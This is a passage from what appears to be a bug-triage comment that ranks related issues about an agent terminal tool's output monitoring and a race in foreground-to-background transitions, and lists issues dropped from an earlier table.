| Weak | #296886 | Terminal tool: "The terminal is awaiting input." fires false-positive after command completes at bash prompt | Closed | Same end-user symptom (unescapable "awaiting input") but a different mechanism (LLM false-positive at shell prompt). The stale-run race could still contribute if the old run reaches `_handleIdleState` after the new run resolved |
| Weak | #307201 | Background terminals that finish are not indicated to the agent | Closed | Different signaling gap (fixed), but touches the same fg→bg transition that calls `continueMonitoringAsync` |
| Weak | #288566 | Allow agent to push a terminal into the background | Open | The fg→bg push is the exact transition that calls `continueMonitoringAsync` and triggers this race |

Dropped from the previous table:

- **#309607** — actually about chat-request cancellation of background tasks (already fixed by @meganrogge in 1.117), not about `OutputMonitor.continueMonitoringAsync`. Different layer.
- **#293859** — the agent acknowledges the deploy is running and then re-issues the command anyway. That is model/prompt behavior, not `OutputMonitor` state corruption.
